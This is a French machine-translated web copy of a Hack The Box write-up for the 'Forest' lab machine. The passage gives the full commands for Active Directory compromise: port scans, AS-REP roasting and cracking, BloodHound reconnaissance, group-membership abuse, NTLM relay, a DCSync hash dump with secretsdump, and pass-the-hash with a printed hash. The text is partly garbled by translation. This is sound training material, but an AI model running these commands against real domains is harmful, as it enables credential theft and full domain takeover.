<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üõÄüèª ü§∏üèΩ üèÑ Hack The Box - Walkthrough Forest. Attaques de torr√©faction AS-REP, DCSync et Pass-The-Hash üßòüèª üßôüèº üòñ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Je continue de publier des solutions envoy√©es pour un traitement ult√©rieur √† partir du site HackTheBox . J'esp√®re que cela aidera au moins quelqu'un √†...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Walkthrough Forest. Attaques de torr√©faction AS-REP, DCSync et Pass-The-Hash</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/493478/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/hb/tr/98/hbtr98btoexwyz38jz8ch0fjkkk.png" alt="image"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je continue de publier des solutions envoy√©es pour </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">un traitement ult√©rieur √†</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> partir du site </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">J'esp√®re que cela aidera au moins quelqu'un √† se d√©velopper dans le domaine de la s√©curit√© de l'information. </font><font style="vertical-align: inherit;">Dans cet article, nous aborderons la torr√©faction AS-REP dans le sch√©ma d'authentification Kerberos, utiliser BloodHound pour la reconnaissance de domaine, effectuer une attaque DCSync PrivExchange et une attaque Pass-The-Hash. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La connexion au laboratoire se fait via VPN. </font><font style="vertical-align: inherit;">Il est recommand√© de ne pas se connecter √† partir d'un ordinateur de travail ou d'un h√¥te o√π les donn√©es importantes pour vous sont disponibles, car vous vous retrouvez sur un r√©seau priv√© avec des personnes qui connaissent quelque chose dans le domaine de la s√©curit√© de l'information :)</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Information organisationnelle</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette machine a une adresse IP 10.10.10.161, que j'ajoute √† / etc / hosts. </font></font><br>
<code>10.10.10.161 forest.htb</code><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, nous analysons les ports ouverts. </font><font style="vertical-align: inherit;">Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan. </font><font style="vertical-align: inherit;">Nous analysons tous les ports TCP et UDP √† partir de l'interface tun0 √† une vitesse de 1000 paquets par seconde.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/z2/ay/2k/z2ay2kvslyrnctqo05rowzjjp34.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il y avait beaucoup de ports ouverts sur l'h√¥te, et j'ai d√©cid√© de m'assurer que les r√©sultats fournis par masscan √©taient corrects. </font><font style="vertical-align: inherit;">Pour ce faire, il suffit de scanner l'√©tat des ports dans nmap.</font></font><br>
<br>
<pre><code class="bash hljs">nmap 10.10.10.161 -p135,636,3269,49676,49665,53,593,49671,9389,49667,5985,49666,389,88,49684,464,3268,49677,47001,139,445,49714</code></pre><br>
<img src="https://habrastorage.org/webt/k6/kx/lp/k6kxlpjjub0ar5feglfjwqnw8ei.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais nmap a tout confirm√©. </font><font style="vertical-align: inherit;">Ensuite, vous devez collecter plus d'informations sur les ports connus de nmap.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A 10.10.10.161 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001</code></pre><br>
<img src="https://habrastorage.org/webt/dr/9d/eb/dr9debajqi1xhlflvnqexznf2ee.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ensuite, vous devez obtenir autant d'informations que possible du syst√®me. </font><font style="vertical-align: inherit;">Pour cela, j'ai utilis√© enum4linux. </font><font style="vertical-align: inherit;">Mais il nous a donn√© peu d'informations. </font><font style="vertical-align: inherit;">Groupes, exigences de mot de passe, manque de SMBv1 et de ressources partag√©es, etc. </font><font style="vertical-align: inherit;">Cependant, nous avons obtenu une liste d'utilisateurs.</font></font><br>
<br>
<pre><code class="bash hljs">enum4linux -a 10.10.10.161</code></pre><br>
<img src="https://habrastorage.org/webt/ez/s-/a-/ezs-a-woghvvdj1ln_mbnukpfhm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√âtant donn√© que Kerberos s'ex√©cute sur l'h√¥te, vous devez v√©rifier s'il existe un tel compte d'utilisateur dont l'indicateur DONT_REQ_PREAUTH est d√©fini dans l'UAC. Vous pouvez en savoir plus sur les drapeaux UAC et leur signification </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . L'indicateur DONT_REQ_PREAUTH signifie que l'authentification Kerberos n'est pas requise pour ce compte. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, d√©couvrez quels comptes d'utilisateurs sont actifs. Cela aidera √† rendre le script samrdump inclus avec impacket.</font></font><br>
<br>
<pre><code class="bash hljs">impacket-samrdump forest.htb</code></pre><br>
<img src="https://habrastorage.org/webt/hi/e6/bz/hie6bzhv73inp0umhaetbakwb5s.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/dg/-n/gv/dg-ngvbdgi9ykyhoyncrko68t_i.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le script affiche d'abord tous les utilisateurs, puis des informations d√©taill√©es sur chacun d'eux. </font><font style="vertical-align: inherit;">De cette fa√ßon, vous pouvez voir que le compte administrateur est actif et que l'invit√© ne l'est pas. </font><font style="vertical-align: inherit;">Maintenant, nous pouvons faire une liste d'utilisateurs actifs. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/y5/n_/et/y5n_etusel7xf5ziwp1z3yczcxu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lorsque nous avons une liste d'utilisateurs actifs, nous pouvons v√©rifier la disponibilit√© du drapeau dont nous avons besoin. </font><font style="vertical-align: inherit;">Nous pouvons le faire en utilisant le script GetNPUsers, qui fait √©galement partie du package impacket. </font><font style="vertical-align: inherit;">Nous sp√©cifions le domaine htb.local, le contr√¥leur de domaine 10.10.10.161, la m√©thode d'authentification Kerberos (-k), l'option sans mot de passe et la liste des utilisateurs.</font></font><br>
<br>
<pre><code class="bash hljs">GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -k -no-pass -usersfile ADUsers.txt </code></pre><br>
<img src="https://habrastorage.org/webt/hf/hs/ok/hfhsokebytkpia9rd58xen45ugi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
On nous dit que ce drapeau n'est pas d√©fini pour tous les utilisateurs sauf svc-alfresco. </font><font style="vertical-align: inherit;">Dans ma version d'impacket (21-dev), le hachage est demand√© automatiquement.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Point d'entr√©e - Torr√©faction AS-REP</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quelques mots sur ce que le hachage nous a √©t√© retourn√©. </font><font style="vertical-align: inherit;">Vous trouverez ci-dessous le sch√©ma d'authentification Kerberos. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vs/3a/ib/vs3aib6d1lag5b-mkuuxistyoic.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme vous pouvez le voir, √† la premi√®re √©tape: le client envoie un message avec l'ID utilisateur au serveur d'authentification AS avec la demande de service au nom de l'utilisateur. </font><font style="vertical-align: inherit;">L'AS g√©n√®re une cl√© secr√®te en hachant le mot de passe de l'utilisateur trouv√© dans la base de donn√©es. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De cette fa√ßon, nous pouvons faire d√©filer le hachage et trouver le mot de passe. </font><font style="vertical-align: inherit;">Ce type d'attaque est appel√© torr√©faction AS-REP. </font><font style="vertical-align: inherit;">Enregistrez le hachage dans un fichier et recherchez le prototype.</font></font><br>
<br>
<pre><code class="bash hljs">john --wordlist=./rockyou.txt hashes2.txt</code></pre><br>
<img src="https://habrastorage.org/webt/ss/k6/9e/ssk69eytthsr6dfxtheeldntuhw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous trouvons le mot de passe utilisateur.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UTILISATEUR</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vous revenez aux ports ouverts, vous pouvez trouver un service WinRM fonctionnel (ou Windows Remote Management) con√ßu pour la gestion √† distance. </font><font style="vertical-align: inherit;">Nous avons un nom d'utilisateur et un mot de passe, nous pouvons donc nous y connecter en toute s√©curit√©. </font><font style="vertical-align: inherit;">Pour cela, j'utilise </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">evil-winrm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jw/iw/kf/jwiwkfl75h-yukol4b7lr5jfpjo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous prenons donc l'utilisateur.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RACINE</font></font></h2><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intelligence avec BloodHound</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, nous devons augmenter nos privil√®ges. Afin de mapper des chemins LPE dans un domaine, vous pouvez utiliser le programme </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Evil-winrm vous permet de t√©l√©charger des fichiers vers et depuis l'h√¥te. J'ai t√©l√©charg√© sur l'h√¥te SharpHound - un module de collecte d'informations. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fe/95/ug/fe95ughqobbdwtby5zpxr6apltc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Evil-winrm vous permet √©galement d'ex√©cuter des scripts PowerShell. Nous indiquerons l'utilisateur, le mot de passe, et aussi que nous voulons savoir tout ce qui est possible. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8c/ga/-g/8cga-gzy4a3ge7g-beygyg0voia.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Une fois le script ex√©cut√©, une archive zip appara√Ætra dans le r√©pertoire courant. Nous le t√©l√©chargeons depuis l'h√¥te. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yz/rm/el/yzrmel0cg0xe7buwuli2olplo18.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ensuite, ex√©cutez le SGBD de graphe neo4j avec lequel BloodHound fonctionne.</font></font><br>
<br>
<pre><code class="bash hljs">neo4j console</code></pre><br>
<img src="https://habrastorage.org/webt/wm/ke/pf/wmkepfwkg0l-bn6o3yniceir-pe.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ex√©cutez maintenant BloodHound. </font><font style="vertical-align: inherit;">Un √©cran vierge nous rencontrera. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gl/kw/hx/glkwhxkprixwilsknm1drmtbbxi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, glissez-d√©posez simplement l'archive t√©l√©charg√©e dedans. </font><font style="vertical-align: inherit;">Et allez dans l'onglet Requ√™tes. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2h/pl/qx/2hplqxwmjfksk31b5xdqactuz1a.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous disons que nous voulons trouver les chemins les plus courts vers les administrateurs de domaine. </font><font style="vertical-align: inherit;">BloodHound va construire un graphique - le chemin vers nos progr√®s constants. </font><font style="vertical-align: inherit;">En cliquant sur chaque n≈ìud du r√©seau, nous recevrons des informations √† son sujet. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/is/k1/j1/isk1j1t-kzohm6carowrfckpa3g.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ainsi, on nous dit que nous devons devenir membre du groupe Autorisations Exchange Windows, car nous sommes trait√©s avec le groupe de services privil√©gi√© Comptes de service, et alors seulement nous pouvons augmenter les privil√®ges.</font></font><br>
<br>
<pre><code class="bash hljs">net user svc-alfresco</code></pre><br>
<img src="https://habrastorage.org/webt/gd/s0/sy/gds0sybjncodwtlk0iw9vyagfbi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'utilisateur n'est pas actuellement dans ce groupe. </font><font style="vertical-align: inherit;">Ajoutons-le, puis v√©rifions les groupes d'utilisateurs.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">Add-ADGroupMember</span> <span class="hljs-string">"Exchange Windows Permissions"</span> svc<span class="hljs-literal">-alfresco</span></code></pre><br>
<img src="https://habrastorage.org/webt/wo/nc/_1/wonc_1wjiqenlgiegyw3w6cbuhq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'utilisateur a bien √©t√© ajout√© au groupe. </font><font style="vertical-align: inherit;">Voyons maintenant ce que cela nous donne. </font><font style="vertical-align: inherit;">Le groupe Autorisations Exchange Windows dispose des droits WriteDACL (droits d'accorder des droits) sur l'objet Domaine dans Active Directory, ce qui permet √† tout membre du groupe de modifier les privil√®ges de domaine, y compris les op√©rations DCSync.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DCSync</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Un peu sur l'attaque DCSync. La r√©plication Active Directory est le processus par lequel les modifications apport√©es √† l'un des contr√¥leurs de domaine sont synchronis√©es avec les autres contr√¥leurs du domaine. Apr√®s avoir obtenu les autorisations n√©cessaires, nous pouvons lancer une demande de r√©plication, ce qui nous permettra d'obtenir des donn√©es stock√©es dans Active Directory, y compris des hachages de mot de passe. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Autrement dit, nous pouvons synchroniser les hachages de mot de passe des utilisateurs Active Directory et se connecter √† n'importe quel service √† l'aide des protocoles NTLM (d√©velopp√©s par le protocole d'authentification r√©seau Microsoft) ou Kerberos. L'attaque implique l'utilisation de deux outils, privexchange.py et ntlmrelayx.py du paquet impacket. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, ex√©cutez ntlmrelayx en mode relais LDAP sur le contr√¥leur de domaine avec le compte svc-alfresco.</font></font><br>
<br>
<pre><code class="bash hljs">ntlmrelayx.py -t ldap://htb.local --escalate-user svc-alfresco</code></pre><br>
<img src="https://habrastorage.org/webt/ks/7h/cd/ks7hcdp2psno63lm-ffqrrdtdyg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tous les services sont en cours d'ex√©cution et attendent une connexion. </font><font style="vertical-align: inherit;">Utilisez maintenant privex.</font></font><br>
<br>
<pre><code class="bash hljs">python privexchange.py 10.10.10.161 -ah _ip -d htb.local -u svc-alfresco -p s3rvice</code></pre><br>
<img src="https://habrastorage.org/webt/wb/j1/yw/wbj1yw8rduzjd6yapfszi7f7g18.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et puis j'ai vol√© un tas d'erreurs, en fouillant quelques minutes, il a √©t√© d√©cid√© de ne pas les corriger. </font><font style="vertical-align: inherit;">Vous pouvez suivre le lien ci-dessus dans le navigateur et passer l'authentification avec les informations d'identification svc-alfresco. </font><font style="vertical-align: inherit;">Dans la fen√™tre avec ntlmrelayx, nous verrons les informations de connexion. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/d3/aj/hn/d3ajhnw1rgrfauebnrc5pxgvqqe.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ex√©cutez maintenant l'attaque DCSync √† l'aide de secretsdump.</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc</code></pre><br>
<img src="https://habrastorage.org/webt/iy/ma/3c/iyma3ca8u7atdk_kav1cf0qroaq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bien. </font><font style="vertical-align: inherit;">Nous avons pu r√©pliquer tous les comptes.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Attaque passe-le-hachage</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette attaque permet √† un attaquant de se connecter √† un serveur distant authentifi√© √† l'aide du protocole NTLM ou LM. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sur les syst√®mes utilisant le protocole d'authentification NTLM, les mots de passe ne sont jamais transmis en texte clair sur un canal de communication. Au lieu de cela, ils sont transf√©r√©s vers le syst√®me appropri√© (tel qu'un contr√¥leur de domaine) sous forme de hachages √† l'√©tape de r√©ponse dans le sch√©ma d'authentification question-r√©ponse. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Les applications Windows demandent √† l'utilisateur le mot de passe en texte clair, puis appellent l'API (par exemple, LsaLogonUser), qui traduit le mot de passe en un hachage LM et un hachage NTLM et les transmet pendant le processus d'authentification. L'analyse des protocoles a montr√© que pour une authentification r√©ussie, il n'est pas n√©cessaire de conna√Ætre le mot de passe sous une forme claire, au lieu de cela, seul son hachage peut √™tre utilis√©.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'attaque est bas√©e sur une faiblesse dans la mise en ≈ìuvre du protocole d'authentification r√©seau. </font><font style="vertical-align: inherit;">Il consiste en ce que les hachages de mot de passe sont transmis sans l'utilisation de sel, et restent donc inchang√©s de session en session (jusqu'√† ce que le mot de passe utilisateur soit modifi√©). </font><font style="vertical-align: inherit;">En d'autres termes, pour un attaquant, les hachages de mot de passe sont √©quivalents aux mots de passe eux-m√™mes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Effectuez une attaque en utilisant psexec.</font></font><br>
<br>
<pre><code class="bash hljs">psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161</code></pre><br>
<img src="https://habrastorage.org/webt/iz/wl/bf/izwlbfbysatzgxcnwmjxw1of6us.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous sommes dans un syst√®me avec tous les droits. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez nous rejoindre sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Cr√©ons une communaut√© dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pourrons toujours nous entraider pour tout probl√®me informatique et de s√©curit√© de l'information.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr493452/index.html">Image d'arri√®re-plan de l'unit√© Flou</a></li>
<li><a href="../fr493458/index.html">Lib√©rez votre Android - Alaverdi</a></li>
<li><a href="../fr493462/index.html">Bain √† ultrasons. Partie 2</a></li>
<li><a href="../fr493468/index.html">N'ayez pas peur de respirer profond√©ment</a></li>
<li><a href="../fr493470/index.html">Des scientifiques d√©couvrent de nouvelles plan√®tes mineures en dehors de Neptune</a></li>
<li><a href="../fr493480/index.html">Architecture pour d√©butants ou pourquoi vous n'avez pas besoin d'ins√©rer un drapeau dans l'√©p√©e</a></li>
<li><a href="../fr493482/index.html">Rencontrez la tortue cybern√©tique, le pr√©d√©cesseur de Roomba</a></li>
<li><a href="../fr493484/index.html">Votre C # est d√©j√† ¬´fonctionnel¬ª, laissez-le.</a></li>
<li><a href="../fr493486/index.html">Les startups automobiles les plus int√©ressantes 2019-2020</a></li>
<li><a href="../fr493488/index.html">Unit√© + git = amiti√©: partie 1 set de gentleman</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>